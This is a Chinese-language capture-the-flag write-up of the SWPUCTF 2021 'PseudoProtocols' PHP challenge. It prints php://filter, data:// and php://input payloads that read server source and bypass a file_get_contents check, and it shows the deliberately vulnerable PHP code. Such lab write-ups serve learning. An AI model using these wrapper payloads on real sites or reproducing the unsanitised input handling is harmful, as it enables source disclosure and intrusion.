# [SWPUCTF 2021 新生赛]PseudoProtocols


# [SWPUCTF 2021 新生赛]PseudoProtocols

![[SWPUCTF 2021 新生赛]PseudoProtocols-1](https://pic.imgdb.cn/item/653bca2dc458853aeff4a414.jpg)

根据提示包含一下 hint.php ，执行了 hint.php 但没有显示

![[SWPUCTF 2021 新生赛]PseudoProtocols-2](https://pic.imgdb.cn/item/653bcabcc458853aeff7759a.jpg)

利用 php://filter 将 hint.php 的内容以 base64 的编码显示

payload：`?wllm=php://filter/convert.base64-encode/resource=hint.php`

![[SWPUCTF 2021 新生赛]PseudoProtocols-3](https://pic.imgdb.cn/item/653bcb8bc458853aeffb96f9.jpg)

解密后得到线索 test2222222222222.php

![[SWPUCTF 2021 新生赛]PseudoProtocols-4](https://pic.imgdb.cn/item/653bcbcdc458853aeffce11f.jpg)

访问 test2222222222222.php

![[SWPUCTF 2021 新生赛]PseudoProtocols-5](https://pic.imgdb.cn/item/653bcc10c458853aeffe1ed8.jpg)

```php
<?php
// 设置脚本的最大执行时间为180秒
ini_set("max_execution_time", "180");
// 显示当前脚本文件的源代码
show_source(__FILE__);
include('flag.php');

// 从GET请求参数中获取名为 "a" 的值
$a = $_GET["a"];

// 检查是否设置了变量 $a 并且文件内容是否等于 'I want flag'
if (isset($a) && (file_get_contents($a, 'r')) === 'I want flag') {
    echo "success\n";
    echo $flag;
}
?>
```

**解法一：**

payload：`?a=data://text/plain;base64,SSB3YW50IGZsYWc=`

SSB3YW50IGZsYWc= 是 "I want flag" 的 base64 编码形式

当脚本执行到 file_get_contents($a, 'r') 时，它会解析 data://text/plain;base64,SSB3YW50IGZsYWc= ，读取base64编码的字符串，并将其与 "I want flag" 进行比较。

![[SWPUCTF 2021 新生赛]PseudoProtocols-6](https://pic.imgdb.cn/item/653bd0dac458853aef1c4a7e.jpg)

> Q：为什么要先把 "I want flag" 进行 base64 编码？
>
> A：服务器过滤 flag 

**解法二：**

利用 php://input ，通过 post 传入 "I want flag"，可借助 Burpsuite 来完成

![[SWPUCTF 2021 新生赛]PseudoProtocols-7](https://pic.imgdb.cn/item/653bd254c458853aef28ea3d.jpg)

> 理论上也可以 hackbar 插件，但在这里有 bug 未能成功
